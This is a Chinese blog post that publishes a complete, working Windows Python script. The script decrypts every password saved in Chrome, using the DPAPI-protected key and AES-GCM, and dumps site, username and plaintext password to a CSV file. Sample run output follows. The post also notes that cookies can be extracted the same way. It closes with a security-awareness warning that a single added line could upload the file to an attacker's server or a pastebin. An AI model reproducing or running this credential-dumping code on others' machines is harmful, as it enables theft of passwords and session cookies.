---
title: "Python 提取 Chrome 本地保存的密码"
subTitle: "请避免使用 Chrome 的自动填充密码功能"
date: 2021-07-06T15:11:14+08:00
tags: ["网络安全", "Chrome", "Python"]
series: ["Cryptology"]
related: true
toc: false
---

## 实现

尝试新建文件 `get_pwd_from_chrome.py`：  

```Python
import os
import json
import base64
import sqlite3
import shutil
import winreg
from time import perf_counter
from win32crypt import CryptUnprotectData
from cryptography.hazmat.primitives.ciphers.aead import AESGCM


def get_desktop():
    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders')
    return winreg.QueryValueEx(key, "Desktop")[0]


def get_string(local_state):
    with open(local_state, 'r', encoding='utf-8') as f:
        s = json.load(f)['os_crypt']['encrypted_key']
    return s


def pull_the_key(base64_encrypted_key):
    encrypted_key_with_header = base64.b64decode(base64_encrypted_key)
    encrypted_key = encrypted_key_with_header[5:]
    key = CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    return key


def decrypt_string(key, data):
    nonce, cipherbytes = data[3:15], data[15:]
    aesgcm = AESGCM(key)
    plainbytes = aesgcm.decrypt(nonce, cipherbytes, None)
    plaintext = plainbytes.decode('utf-8')
    return plaintext


def get_password_from_chrome():
    local_state = os.environ['LOCALAPPDATA'] + r'\Google\Chrome\User Data\Local State'
    origin_file = os.path.join(os.environ['LOCALAPPDATA'], r'Google\Chrome\User Data\Default\Login Data')

    tmp_file = os.path.join(os.environ['LOCALAPPDATA'], 'chrome_password.db')
    if os.path.exists(tmp_file):
        os.remove(tmp_file)
    shutil.copyfile(origin_file, tmp_file)
    pwd_text = "网站,帐号,密码\n"
    sql = "select signon_realm,username_value,password_value from logins"
    with sqlite3.connect(tmp_file) as conn:
        cu = conn.cursor()
        res = cu.execute(sql).fetchall()
        cu.close()
        key = pull_the_key(get_string(local_state))
        for signon_realm, username_value, password_value in res:
            if password_value[0:3] == b'v10':
                password = decrypt_string(key, password_value)
            else:
                password = CryptUnprotectData(password_value)[1].decode()
            pwd_text += '"%s","%s","%s"\n' % (signon_realm, username_value, password)
    conn.close()
    os.remove(tmp_file)

    filename = os.path.join(get_desktop(), r'chrome_password.csv')
    with open(filename, 'w') as f:
        f.write(pwd_text)


if __name__ == "__main__":
    start = perf_counter()
    get_password_from_chrome()
    elapsed = perf_counter() - start
    print(f"已将 Chrome 中保存的密码提取到桌面的 chrome_password.csv 文件\n用时 {elapsed} 秒")
```

```Bash
$ pip install pywin32 cryptography
$ python ./get_pwd_from_chrome.py

已将 Chrome 中保存的密码提取到桌面的 chrome_password.csv 文件
用时 0.04970019999999997 秒
```

打开桌面上的 `chrome_password.csv`\* 看看。  

> \* 没有 Excel 的话随便什么文本编辑器都行。  

## 其他应用

不拿密码，而是从 Chrome 的本地数据库拿 cookie 也是做得到的。  
我的各种网站和 APP 自动签到脚本就利用了这个技巧。  
服务器上的 cookies 过期需要更新的时候（服务器和本地的 cookies 永远是同步的），我在自己电脑上重新登录，一键把刷新后的 cookies 上传到服务器，自动签到又继续工作了。  
甚至可以做到过期时通知本地然后自动登录更新 cookies，但我没有采用这种全自动方案，太过于智能会导致我没有安全感。  

## 结论

运行上面这个脚本，你的杀软报毒了吗？  
那我再加一行代码，把你的 `chrome_password.csv` 上传到我的服务器\*，真的很难吗？  

> \* 即便我是个怂比，挂了一万层代理，仍然害怕暴露身份。  
> 大不了放弃直球上传，换成用 [pastebin](https://paste.ubuntu.com/) 之类的在线剪贴板转一道手，多大点事。  
> 2021 年了，互联网发展到如今，鸭子都到嘴里了还怕我叼不走吗？  

> 2021.11.17 悲报，前段时间发现 pastebin 要注册才能发内容了。  
> ~~不过还有别的在线剪贴板~~  

所以请一定牢记「**不能随便运行**网上下的或者别人给的**可执行文件**\*」。  

> \* 包括但不限于 `.exe` / `.apk` 等等。  
> 尤其是喜欢折腾安卓（反手就是一个 root）安全意识又不到位的。  
> 手机上能丢的隐私可比 PC 上多太多了。  

对方如果真的没安好心，不说上什么厉害的大马（远程控制、加密你的重要文件然后进行勒索、etc），就是简单一个顺手牵羊你都受不了。  
